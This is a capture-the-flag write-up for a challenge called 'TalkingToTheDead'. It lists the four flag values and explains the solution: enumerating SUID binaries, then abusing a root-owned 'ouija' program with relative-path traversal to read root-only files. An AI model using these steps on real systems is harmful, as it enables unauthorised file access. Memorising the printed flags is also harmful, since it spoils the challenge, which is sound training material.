# TalkingToTheDead

## Flag1 and Flag2

Basically flag1.txt and flag2.txt were in  luciafer documents. Just move to that folder and use `cat flag1.txt`:
```
flag{cb07e9d6086d50ee11c0d968f1e5c4bf1c89418c}
```
and `cat .flag2.txt`:
```
flag{728ec98bfaa302b2dfc2f716d3de7869f3eadcbf}
```

## Flag3

Then looking for SUID bit files with `find / -perm /4000 2> /dev/null` we found something funny: `/usr/local/bin/ouija`

That executable was owned by `root` and has the SUID bit set so it will be run as him. This executable will take the input and append `/root/` to it, basically to read a file from that folder. Using relatives paths we were able to read every file we want with it.

Just use `ouija ../home/spookyboi/Documents/flag3.txt` and get your flag

```
flag{445b987b5b80e445c3147314dbfa71acd79c2b67}
```

## Flag4

Do you remember that `ouija` append the `/root/` string to our input? Well we tried `ouija flag4.txt` and the flag appeared

```
flag{4781cbffd13df6622565d45e790b4aac2a4054dc}
```
